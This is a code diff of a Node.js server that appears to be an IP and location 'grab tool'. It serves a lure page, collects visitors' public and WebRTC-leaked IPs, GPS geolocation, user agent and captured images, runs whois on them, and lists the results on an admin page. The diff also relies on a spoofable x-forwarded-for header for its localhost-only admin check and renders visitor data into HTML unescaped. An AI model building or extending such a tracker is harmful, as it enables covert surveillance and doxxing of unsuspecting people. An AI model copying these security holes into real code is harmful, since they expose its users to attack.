@@ -1,13 +1,18 @@
 const http = require('http');
-const { exec } = require('child_process');
-const net = require('net');
 const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
+const net = require('net');
+const { exec } = require('child_process');
 
 const PORT = 3000;
 
-// --- Load config ---
+// --- Directories ---
+const PUBLIC_DIR = path.join(__dirname, 'public');
+const IMAGE_DIR  = path.join(__dirname, 'images');
+if (!fs.existsSync(IMAGE_DIR)) fs.mkdirSync(IMAGE_DIR);
+
+const DATA_FILE = path.join(__dirname, 'data.json');
 const CONFIG_FILE = path.join(__dirname, 'config.json');
 if (!fs.existsSync(CONFIG_FILE)) {
   console.error('Config file not found. Run pass.py first.');
@@ -15,12 +20,38 @@ if (!fs.existsSync(CONFIG_FILE)) {
 }
 const CONFIG = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
 
-// --- Data / images ---
-const DATA_FILE = path.join(__dirname, 'data.json');
-const IMAGE_DIR = path.join(__dirname, 'images');
-if (!fs.existsSync(IMAGE_DIR)) fs.mkdirSync(IMAGE_DIR);
+// --- Helper: safely serve static files ---
+function serveStatic(baseDir, reqPath, res, contentType = null) {
+  try {
+    const decodedPath = decodeURIComponent(reqPath);
+    const absPath = path.resolve(baseDir, '.' + decodedPath);
 
-// --- Utility: check if IP is public ---
+    if (!absPath.startsWith(baseDir)) {
+      res.writeHead(403);
+      return res.end('Forbidden');
+    }
+
+    if (!fs.existsSync(absPath) || !fs.statSync(absPath).isFile()) {
+      res.writeHead(404);
+      return res.end('Not found');
+    }
+
+    if (!contentType) {
+      if (absPath.endsWith('.js')) contentType = 'application/javascript';
+      else if (absPath.endsWith('.css')) contentType = 'text/css';
+      else if (absPath.endsWith('.png')) contentType = 'image/png';
+      else contentType = 'text/html';
+    }
+
+    res.writeHead(200, { 'Content-Type': contentType + '; charset=utf-8' });
+    fs.createReadStream(absPath).pipe(res);
+  } catch (e) {
+    res.writeHead(400);
+    res.end('Bad request');
+  }
+}
+
+// --- Utility: IP helpers ---
 function isPublicIP(ip) {
   if (net.isIP(ip) === 4) {
     return !(
@@ -38,14 +69,12 @@ function isPublicIP(ip) {
   return false;
 }
 
-// --- Whois helper ---
 function runWhois(ip, cb) {
   exec(`whois "${ip}"`, { timeout: 10000, maxBuffer: 1024 * 1024 }, (err, stdout) => {
     cb(err ? `WHOIS error: ${err.message}` : stdout);
   });
 }
 
-// --- IP label helper ---
 function ipLabel(ip, type) {
   const version = net.isIP(ip) === 4 ? 'IPv4' : 'IPv6';
   if (isPublicIP(ip)) {
@@ -62,10 +91,7 @@ function saveRecord(record) {
     try {
       const raw = fs.readFileSync(DATA_FILE, 'utf8');
       arr = raw.trim() ? JSON.parse(raw) : [];
-    } catch (e) {
-      console.error("Failed to parse data.json:", e);
-      arr = [];
-    }
+    } catch (e) { arr = []; }
   }
   arr.push(record);
   fs.writeFileSync(DATA_FILE, JSON.stringify(arr, null, 2));
@@ -73,25 +99,22 @@ function saveRecord(record) {
 
 // --- Server ---
 const server = http.createServer((req, res) => {
-  let clientIP = req.socket.remoteAddress || '';
-  clientIP = clientIP.replace(/^::ffff:/, ''); // normalize IPv4-mapped IPv6
+  let clientIP = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').replace(/^::ffff:/,'');
 
-  console.log("Client IP:", clientIP);
-
-  // Serve images
+  // --- Serve images ---
   if (req.url.startsWith('/images/')) {
-    const file = path.join(IMAGE_DIR, path.basename(req.url));
-    if (fs.existsSync(file)) {
-      res.writeHead(200, { 'Content-Type': 'image/png' });
-      return fs.createReadStream(file).pipe(res);
-    }
-    res.writeHead(404); return res.end('Not found');
+    return serveStatic(IMAGE_DIR, req.url.replace('/images',''), res, 'image/png');
   }
 
-  // Handle uploads
+  // --- Serve user page ---
+  if (req.url === '/' || req.url === '/user.html') {
+    return serveStatic(PUBLIC_DIR, '/user.html', res, 'text/html');
+  }
+
+  // --- Collect POST data ---
   if (req.url === '/collect' && req.method === 'POST') {
     let body = '';
-    req.on('data', c => body += c);
+    req.on('data', chunk => body += chunk);
     req.on('end', () => {
       try {
         const data = JSON.parse(body);
@@ -103,34 +126,49 @@ const server = http.createServer((req, res) => {
           geolocation: data.geolocation || null,
           userAgent: data.userAgent || '',
           whois: {},
-          imageFile: null
+          imageFile: null,
+          saved: false
         };
 
+        // Save image if provided
         if (data.image) {
           const imgName = `capture_${Date.now()}.png`;
           fs.writeFileSync(path.join(IMAGE_DIR, imgName), Buffer.from(data.image, 'base64'));
           record.imageFile = imgName;
         }
 
+        // Public IPs for WHOIS
         const ips = [];
         if (record.externalPublicIP && isPublicIP(record.externalPublicIP)) ips.push(record.externalPublicIP);
         record.webrtcIPs.forEach(ip => { if (isPublicIP(ip)) ips.push(ip); });
 
-        let pending = ips.length;
-        if (pending === 0) { saveRecord(record); res.writeHead(200, {'Content-Type':'application/json'}); return res.end(JSON.stringify({status:'ok'})); }
+        const finalize = () => {
+          if (!record.saved) {
+            record.saved = true;
+            saveRecord(record);
+            res.writeHead(200, {'Content-Type':'application/json'});
+            res.end(JSON.stringify({status:'ok'}));
+          }
+        };
 
-        ips.forEach(ip => {
-          runWhois(ip, out => {
-            record.whois[ip] = out;
-            if (--pending === 0) {
-              saveRecord(record);
-              res.writeHead(200, {'Content-Type':'application/json'});
-              res.end(JSON.stringify({status:'ok'}));
-            }
+        if (ips.length === 0) {
+          finalize();
+        } else {
+          let pending = ips.length;
+          ips.forEach(ip => {
+            runWhois(ip, out => {
+              record.whois[ip] = out;
+              pending--;
+              if (pending === 0) finalize();
+            });
           });
-        });
+          // Fallback save after 5s
+          setTimeout(finalize, 5000);
+        }
+
       } catch (e) {
-        res.writeHead(400); res.end('bad json');
+        res.writeHead(400);
+        res.end('bad json');
       }
     });
     return;
@@ -138,8 +176,7 @@ const server = http.createServer((req, res) => {
 
   // --- Admin page ---
   if (req.url === '/admin') {
-    // Only allow localhost
-    if (!['127.0.0.1', '::1'].includes(clientIP)) {
+    if (!['127.0.0.1','::1'].includes(clientIP)) {
       res.writeHead(403);
       return res.end('Forbidden: admin only accessible from localhost');
     }
@@ -157,8 +194,6 @@ const server = http.createServer((req, res) => {
     }
 
     const [inputUser, inputPass] = creds;
-
-    // Scrypt password check
     const [salt, key] = CONFIG.adminHash.split(':');
     const hash = crypto.scryptSync(inputPass, salt, 64).toString('hex');
     const valid = crypto.timingSafeEqual(Buffer.from(hash,'hex'), Buffer.from(key,'hex'));
@@ -168,18 +203,12 @@ const server = http.createServer((req, res) => {
       return res.end('Invalid credentials');
     }
 
-    // Serve admin page
+    // --- Render last 20 records ---
     let dataArr = [];
     if (fs.existsSync(DATA_FILE)) {
-      try {
-        const raw = fs.readFileSync(DATA_FILE,'utf8');
-        dataArr = raw.trim() ? JSON.parse(raw) : [];
-      } catch(e) {
-        dataArr = [];
-      }
+      try { dataArr = JSON.parse(fs.readFileSync(DATA_FILE,'utf8')); } 
+      catch(e) { dataArr = []; }
     }
-
-    // Show only last 20 records
     dataArr = dataArr.slice(-20);
 
     let out = '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Admin</title><style>'+
@@ -193,7 +222,7 @@ const server = http.createServer((req, res) => {
       '@media(max-width:600px){.record{width:95%;padding:10px;}}'+
       `</style></head><body><h1 style="color:#0f0;">Console's Grab tool</h1>`;
 
-    dataArr.forEach((rec, i) => {
+    dataArr.forEach((rec,i)=>{
       out += `<div class="record"><h2>Record ${i+1} (${rec.timestamp})</h2>`;
       out += `<span class="label" style="color:#ff0;">Server Connection IP:</span> <span style="color:#0f0;">${rec.serverObservedIP}</span><br>`;
       out += `<span class="label" style="color:#0ff;">Public WAN IP:</span> <span style="color:#0f0;">${rec.externalPublicIP || 'N/A'}</span><br>`;
@@ -201,39 +230,31 @@ const server = http.createServer((req, res) => {
       if (rec.geolocation) {
         out += `<span class="label">Geolocation:</span> <a class="geo" target="_blank" href="https://maps.google.com/?q=${rec.geolocation.lat},${rec.geolocation.lng}">${rec.geolocation.lat},${rec.geolocation.lng}</a> <span>(±${rec.geolocation.acc}m)</span><br>`;
       }
-      if (rec.webrtcIPs.length) {
+      if (rec.webrtcIPs?.length) {
         out += `<span class="label">WebRTC Discovered:</span> <pre class="prebox">`;
-        rec.webrtcIPs.forEach(ip => { out += ipLabel(ip,"WebRTC") + "\n"; });
+        rec.webrtcIPs.forEach(ip=>{ out += ipLabel(ip,"WebRTC") + "\n"; });
         out += `</pre>`;
       }
       if (rec.imageFile) out += `<span class="label">Captured Image:</span><br><img src="/images/${rec.imageFile}"><br>`;
       if (rec.whois) {
-        for (let [ip, whois] of Object.entries(rec.whois)) {
-          let version = net.isIP(ip) === 4 ? 'IPv4' : 'IPv6';
-          let preview = whois.length > 1000 ? whois.slice(0,1000) + "\n[truncated]" : whois;
-          out += `<h3 style="color:#0f0;">WHOIS for ${ip} (${version})</h3><pre class="prebox">${preview}</pre>`;
+        for (let [ip,w] of Object.entries(rec.whois)) {
+          let preview = w.length>1000?w.slice(0,1000)+"\n[truncated]":w;
+          out += `<h3 style="color:#0f0;">WHOIS for ${ip}</h3><pre class="prebox">${preview}</pre>`;
         }
       }
       out += `</div>`;
     });
 
     out += '</body></html>';
-    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+    res.writeHead(200, { 'Content-Type':'text/html; charset=utf-8' });
     return res.end(out);
   }
 
-  // --- User-facing page ---
-  const htmlPath = path.join(__dirname, 'user.html');
-  if (fs.existsSync(htmlPath)) {
-    let html = fs.readFileSync(htmlPath, 'utf8');
-    html = html.replace('${serverIP}', clientIP);
-    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
-    return res.end(html);
-  }
-
-  res.writeHead(404); res.end('Not found');
+  // --- 404 fallback ---
+  res.writeHead(404);
+  res.end('Not found');
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-  console.log("Server running at http://localhost:" + PORT + "/");
+  console.log(`Server running at http://localhost:${PORT}/`);
 });
